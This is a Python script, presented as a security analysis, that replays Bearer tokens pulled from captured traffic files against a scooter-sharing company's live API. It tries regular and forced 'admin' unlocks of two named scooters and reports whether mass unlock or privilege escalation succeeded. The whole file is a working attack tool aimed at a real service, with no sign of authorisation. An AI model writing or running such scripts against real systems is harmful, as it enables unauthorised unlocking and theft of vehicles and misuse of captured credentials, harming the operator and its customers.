#!/usr/bin/env python3
"""
Comprehensive Security Analysis
Tests both TUF061 and SXB306 to understand the security model
"""

import requests
import json
import time
import re
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# Test Scooters
TEST_SCOOTERS = {
    "TUF061": {
        "serial": "TUF061",
        "lat": 48.8566,
        "lng": 2.3522,
        "description": "Previously unlocked scooter"
    },
    "SXB306": {
        "serial": "SXB306", 
        "lat": 48.8566,
        "lng": 2.3522,
        "description": "New account scooter"
    }
}

def extract_latest_token():
    """Extract the latest token from capture files"""
    print("[SEARCH] Extracting latest token...")
    
    # Try LATEST_TOKEN.txt first
    try:
        with open('LATEST_TOKEN.txt', 'r', encoding='utf-8') as f:
            token = f.read().strip()
        if token and token.startswith('Bearer '):
            print(f"[OK] Found token in LATEST_TOKEN.txt: {token[:50]}...")
            return token
    except:
        pass
    
    # Fallback to capture files
    capture_files = [
        'CAPTURED_NEW_ACCOUNT.txt',
        'CAPTURED_WORKING_FINAL.txt', 
        'CAPTURED_API_DECRYPT.txt',
        'CAPTURED_API.txt'
    ]
    
    for filename in capture_files:
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Look for Bearer tokens
            bearer_pattern = r'Bearer eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            tokens = re.findall(bearer_pattern, content)
            
            if tokens:
                token = tokens[-1]  # Get the most recent
                print(f"[OK] Found token in {filename}: {token[:50]}...")
                return token
        except:
            continue
    
    print("[ERROR] No Bearer tokens found")
    return None

def test_scooter_unlock(token, scooter_name, scooter_data):
    """Test regular unlock for a specific scooter"""
    print(f"\n{'='*80}")
    print(f"[TEST] {scooter_name} REGULAR UNLOCK TEST")
    print(f"{'='*80}")
    print(f"[TARGET] Scooter: {scooter_data['serial']}")
    print(f"[DESCRIPTION] {scooter_data['description']}")
    print(f"[LOCATION] Lat: {scooter_data['lat']}, Lng: {scooter_data['lng']}")
    print(f"[TOKEN] {token[:50]}...")
    print(f"{'='*80}")
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Regular unlock payload
    payload = {
        "serial_number": scooter_data['serial'],
        "lat": scooter_data['lat'],
        "lng": scooter_data['lng']
    }
    
    print(f"[PAYLOAD] {json.dumps(payload, indent=2)}")
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=payload,
            timeout=15
        )
        
        print(f"[STATUS] {response.status_code}")
        print(f"[RESPONSE] {response.text}")
        
        if response.status_code == 200:
            print(f"[SUCCESS] {scooter_name} UNLOCKED!")
            return True, "SUCCESS"
        elif response.status_code == 401:
            print(f"[ERROR] Token expired/invalid")
            return False, "TOKEN_EXPIRED"
        elif response.status_code == 403:
            print(f"[ERROR] Permission denied")
            return False, "PERMISSION_DENIED"
        elif response.status_code == 400:
            print(f"[ERROR] Bad request")
            try:
                error_data = response.json()
                print(f"[ERROR_DETAILS] {error_data}")
            except:
                print(f"[ERROR_DETAILS] {response.text}")
            return False, "BAD_REQUEST"
        else:
            print(f"[ERROR] Unexpected response: {response.status_code}")
            return False, f"UNEXPECTED_{response.status_code}"
            
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return False, "REQUEST_FAILED"

def test_scooter_admin_unlock(token, scooter_name, scooter_data):
    """Test admin unlock for a specific scooter"""
    print(f"\n{'='*80}")
    print(f"[ADMIN TEST] {scooter_name} ADMIN UNLOCK TEST")
    print(f"{'='*80}")
    print(f"[TARGET] Scooter: {scooter_data['serial']}")
    print(f"[DESCRIPTION] {scooter_data['description']}")
    print(f"[LOCATION] Lat: {scooter_data['lat']}, Lng: {scooter_data['lng']}")
    print(f"[TOKEN] {token[:50]}...")
    print(f"{'='*80}")
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Admin unlock payload
    payload = {
        "serial_number": scooter_data['serial'],
        "lat": scooter_data['lat'],
        "lng": scooter_data['lng'],
        "force": True
    }
    
    print(f"[ADMIN PAYLOAD] {json.dumps(payload, indent=2)}")
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock/admin",
            headers=headers,
            json=payload,
            timeout=15
        )
        
        print(f"[STATUS] {response.status_code}")
        print(f"[RESPONSE] {response.text}")
        
        if response.status_code == 200:
            print(f"[SUCCESS] {scooter_name} ADMIN UNLOCKED!")
            return True, "ADMIN_SUCCESS"
        elif response.status_code == 401:
            print(f"[ERROR] Token expired/invalid for admin endpoint")
            return False, "ADMIN_TOKEN_EXPIRED"
        elif response.status_code == 403:
            print(f"[ERROR] Admin permission denied")
            return False, "ADMIN_PERMISSION_DENIED"
        elif response.status_code == 400:
            print(f"[ERROR] Bad request for admin endpoint")
            try:
                error_data = response.json()
                print(f"[ERROR_DETAILS] {error_data}")
            except:
                print(f"[ERROR_DETAILS] {response.text}")
            return False, "ADMIN_BAD_REQUEST"
        else:
            print(f"[ERROR] Unexpected admin response: {response.status_code}")
            return False, f"ADMIN_UNEXPECTED_{response.status_code}"
            
    except Exception as e:
        print(f"[ERROR] Admin request failed: {e}")
        return False, "ADMIN_REQUEST_FAILED"

def main():
    print("=" * 80)
    print("[COMPREHENSIVE] SECURITY ANALYSIS")
    print("=" * 80)
    print("[WARNING] Testing both TUF061 and SXB306 to understand security model!")
    print("=" * 80)
    
    # Extract token
    token = extract_latest_token()
    if not token:
        print("[ERROR] No token found. Please capture a fresh token first.")
        return
    
    results = {}
    
    # Test each scooter
    for scooter_name, scooter_data in TEST_SCOOTERS.items():
        print(f"\n{'='*80}")
        print(f"[TESTING] {scooter_name}")
        print(f"{'='*80}")
        
        # Test regular unlock
        regular_success, regular_result = test_scooter_unlock(token, scooter_name, scooter_data)
        
        # Test admin unlock
        admin_success, admin_result = test_scooter_admin_unlock(token, scooter_name, scooter_data)
        
        results[scooter_name] = {
            'regular': {'success': regular_success, 'result': regular_result},
            'admin': {'success': admin_success, 'result': admin_result}
        }
    
    # Analysis
    print("\n" + "=" * 80)
    print("[ANALYSIS] SECURITY MODEL ANALYSIS")
    print("=" * 80)
    
    for scooter_name, result in results.items():
        print(f"\n[{scooter_name}] Results:")
        print(f"  Regular Unlock: {result['regular']['result']}")
        print(f"  Admin Unlock: {result['admin']['result']}")
    
    # Security Assessment
    print(f"\n{'='*80}")
    print("[ASSESSMENT] SECURITY VULNERABILITY ASSESSMENT")
    print(f"{'='*80}")
    
    tuf061_regular = results['TUF061']['regular']['success']
    sxb306_regular = results['SXB306']['regular']['success']
    tuf061_admin = results['TUF061']['admin']['success']
    sxb306_admin = results['SXB306']['admin']['success']
    
    if tuf061_regular and not sxb306_regular:
        print("[CRITICAL] SCOPE ESCALATION VULNERABILITY CONFIRMED!")
        print("[CRITICAL] Token can unlock previously accessed scooters but not new ones!")
        print("[CRITICAL] This suggests session-based or scooter-specific permissions!")
    elif tuf061_regular and sxb306_regular:
        print("[CRITICAL] MASS UNLOCK VULNERABILITY CONFIRMED!")
        print("[CRITICAL] Token can unlock ANY scooter in the system!")
    elif not tuf061_regular and not sxb306_regular:
        print("[OK] Regular unlock security appears to be working properly")
    
    if tuf061_admin or sxb306_admin:
        print("[CRITICAL] ADMIN PRIVILEGE ESCALATION CONFIRMED!")
        print("[CRITICAL] Regular users can perform admin operations!")
    else:
        print("[OK] Admin privilege escalation protection appears to be working")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
